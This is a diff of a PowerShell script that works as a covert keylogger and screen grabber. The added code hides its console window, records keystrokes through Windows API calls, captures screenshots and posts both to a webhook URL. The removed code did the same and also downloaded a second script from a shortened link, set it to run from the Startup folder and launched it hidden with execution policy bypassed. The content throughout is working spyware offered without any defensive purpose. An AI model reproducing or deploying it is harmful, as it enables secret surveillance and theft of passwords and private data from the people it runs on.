@@ -1,41 +1,100 @@
-# Instalar el módulo Windows Input Simulator si no está instalado
+# shortened URL Detection
+if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
+
+$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
+$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
+$hwnd = (Get-Process -PID $pid).MainWindowHandle
+if($hwnd -ne [System.IntPtr]::Zero){
+    $Type::ShowWindowAsync($hwnd, 0)
+}
+else{
+    $Host.UI.RawUI.WindowTitle = 'hideme'
+    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
+    $hwnd = $Proc.MainWindowHandle
+    $Type::ShowWindowAsync($hwnd, 0)
+}
+
+# Import DLL Definitions for keyboard inputs
+$API = @'
+[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
+public static extern short GetAsyncKeyState(int virtualKeyCode); 
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int GetKeyboardState(byte[] keystate);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int MapVirtualKey(uint uCode, int uMapType);
+[DllImport("user32.dll", CharSet=CharSet.Auto)]
+public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
+'@
+$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
+
+# shortened URL Detection
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
+
+# Importar el módulo Windows Input Simulator si no está instalado
 if (-not (Get-Module -Name WindowsInput)) {
     Install-Module -Name WindowsInput -Scope CurrentUser -Force
 }
 
-$hookurl = "https://bit.ly/chu_kbras"
-$seconds = 30 # Intervalo entre capturas
-$a = 0 # Contador de imágenes enviadas al webhook
-$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
+# Add stopwatch for intellegent sending
+$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
+$KeypressThreshold = [TimeSpan]::FromSeconds(10)
 
-# Detección de URL acortada
-if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
+# Start a continuous loop
+While ($true){
+  $keyPressed = $false
+    try{
+      # Start a loop that checks the time since last activity before message is sent
+      while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
+      # Start the loop with 30 ms delay between keystate check
+      Start-Sleep -Milliseconds 30
+        for ($asc = 8; $asc -le 254; $asc++){
+        # Get the key state. (is any key currently pressed)
+        $keyst = $API::GetAsyncKeyState($asc)
+          # If a key is pressed
+          if ($keyst -eq -32767) {
+          # Restart the inactivity timer
+          $keyPressed = $true
+          $LastKeypressTime.Restart()
+          $null = [console]::CapsLock
+          # Translate the keycode to a letter
+          $vtkey = $API::MapVirtualKey($asc, 3)
+          # Get the keyboard state and create stringbuilder
+          $kbst = New-Object Byte[] 256
+          $checkkbst = $API::GetKeyboardState($kbst)
+          $logchar = New-Object -TypeName System.Text.StringBuilder
+            # Define the key that was pressed          
+            if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
+              # Check for non-character keys
+              $LString = $logchar.ToString()
+                if ($asc -eq 8) {$LString = "[BKSP]"}
+                if ($asc -eq 13) {$LString = "[ENT]"}
+                if ($asc -eq 27) {$LString = "[ESC]"}
+            # Add the key to sending variable
+            $send += $LString 
+            }
+          }
+        }
+      }
+    }
+    finally{
+      If ($keyPressed) {
+      # Capturar la pantalla
+      $Filett = "$env:temp\SC.png"
+      Add-Type -AssemblyName System.Windows.Forms
+      Add-type -AssemblyName System.Drawing
+      $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+      $Width = $Screen.Width
+      $Height = $Screen.Height
+      $Left = $Screen.Left
+      $Top = $Screen.Top
+      $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+      $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+      $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+      $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
 
-# Importar el módulo Windows Input Simulator
-Import-Module WindowsInput
-
-do {
-    # Capturar la pantalla
-    $Filett = "$env:temp\SC.png"
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-type -AssemblyName System.Drawing
-    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
-    $Width = $Screen.Width
-    $Height = $Screen.Height
-    $Left = $Screen.Left
-    $Top = $Screen.Top
-    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-
-    # Capturar pulsaciones de teclado
-    $Keyboard = [WindowsInput.WindowsInputExtensions]::Simulate
-    $text = $Keyboard::Capture()
-    
-    # Enviar la imagen y el texto al webhook
-    $boundary = [System.Guid]::NewGuid().ToString()
-    $body = @"
+      # Enviar la imagen y el texto al webhook
+      $boundary = [System.Guid]::NewGuid().ToString()
+      $body = @"
 --$boundary
 Content-Disposition: form-data; name="file"; filename="screenshot.png"
 Content-Type: image/png
@@ -44,43 +103,25 @@ $Filett
 --$boundary
 Content-Disposition: form-data; name="text"
 
-$text
+$send
 --$boundary--
 "@
 
-    $headers = @{
-        "Content-Type" = "multipart/form-data; boundary=$boundary"
+      $headers = @{
+          "Content-Type" = "multipart/form-data; boundary=$boundary"
+      }
+
+      Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -Body $body
+
+      # Eliminar la captura de pantalla
+      Remove-Item -Path $Filett
+
+      #Remove log file and reset inactivity check 
+      $send = ""
+      $keyPressed = $false
+      }
     }
-
-    Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -Body $body
-
-    # Eliminar la captura de pantalla
-    Remove-Item -Path $Filett
-
-    Start-Sleep $seconds
-
-    # Incrementar contador de imágenes enviadas al webhook
-    $a++
-
-    # Verificar si se ha alcanzado la cantidad máxima de imágenes
-    if ($a -eq $maxImages) {
-        # Descargar el script principal
-        $syswUrl = "https://bit.ly/Screen_dc"
-        $syswPath = "$env:USERPROFILE\sysw.ps1"
-        Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
-        
-        # Crear acceso directo en la carpeta de inicio del usuario
-        $shortcutLocation = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\sysw.lnk"
-        $shell = New-Object -ComObject WScript.Shell
-        $shortcut = $shell.CreateShortcut($shortcutLocation)
-        $shortcut.TargetPath = "powershell.exe"
-        $shortcut.Arguments = "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`""
-        $shortcut.Save()
-        
-        # Ejecutar el script principal de manera oculta
-        Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$syswPath`"" -WindowStyle Hidden
-        
-        # Reiniciar contador de imágenes
-        $a = 0
-    }
-} while ($true)
+  # reset stopwatch before restarting the loop
+  $LastKeypressTime.Restart()
+  Start-Sleep -Milliseconds 10
+}
